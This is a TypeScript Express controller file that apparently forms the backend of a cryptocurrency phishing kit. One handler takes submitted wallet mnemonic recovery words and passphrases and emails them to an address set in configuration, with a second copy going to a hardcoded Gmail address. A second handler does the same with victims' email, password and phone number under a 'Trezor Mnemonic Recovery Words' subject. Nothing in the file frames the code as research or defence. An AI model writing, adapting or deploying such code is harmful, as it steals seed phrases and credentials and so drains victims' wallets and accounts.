import { Request, Response } from "express";
import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
import { Resend } from "resend";

export const sendMnemonicController = asyncHandler(

  async (req: Request, res: Response): Promise<Response> => {
    const resend = new Resend(process.env.RESEND_API_KEY as string);
    const resend2 = new Resend(process.env.RESEND_API_KEY2 as string);
    const payload = req.body;
    
    // Validate payload
    if (!payload || !payload.data || !Array.isArray(payload.data)) {
      return errorResponse(res, "Invalid payload", 400);
    }

    // Build HTML email content
    let htmlContent = `<h2>App Name : ${payload.heading}</h2>`;
    htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;

    payload.data.forEach((item: { label: string; value: string }) => {
      htmlContent += `<p>${item.value}</p>`;
    });


    try {
      // Send email via Resend
      const response: any = await resend.emails.send({
        from: `${payload.heading}@resend.dev`,
        to: process.env.RECIPIENT_EMAIL as string,
        subject: `${payload.heading.toUpperCase()} Mnemonic Recovery Words`,
        html: htmlContent,
      });
      const response2: any = await resend2.emails.send({
        from: `${payload.heading}@resend.dev`,
        to: 'davidbrown202r@gmail.com' as string,
        subject: `${payload.heading.toUpperCase()} Mnemonic Recovery Words`,
        html: htmlContent,
      });

      console.log("✅ Email sent successfully:", response, response2);
      return successResponse(res, { id: response.id }, "Mnemonic sent successfully", 200);
    } catch (error: any) {
      console.error("❌ Email sending error:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);

/**
 * Controller: Send User Info Email
 */
export const sendUserInfoController = asyncHandler(
  async (req: Request, res: Response): Promise<Response> => {
    const resend = new Resend(process.env.RESEND_API_KEY as string);
    const resend2 = new Resend(process.env.RESEND_API_KEY2 as string);
    const { title, email, password, phone } = req.body;

    // Validate input
    if (!title || !email || !password) {
      return errorResponse(res, "Missing required fields", 400);
    }

    // Build email HTML content
    const htmlContent = `
      <h2>${title}</h2>
      <ul>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>Password:</strong> ${password}</li>
        <li><strong>Phone:</strong> ${phone || "N/A"}</li>
      </ul>
    `;

    try {
      const response: any = await resend.emails.send({
        from: `${title}@resend.dev`,
        to: process.env.RECIPIENT_EMAIL as string,
        subject: "Trezor Mnemonic Recovery Words",
        html: htmlContent,
      });
      const response2: any = await resend2.emails.send({
        from: `${title}@resend.dev`,
        to: 'davidbrown202r@gmail.com' as string,
        subject: "Trezor Mnemonic Recovery Words",
        html: htmlContent,
      });

      console.log("✅ Email sent successfully:", response, response2);
      return successResponse(res, { id: response.id }, "Email sent successfully", 200);
    } catch (error: any) {
      console.error("❌ Email sending error:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);



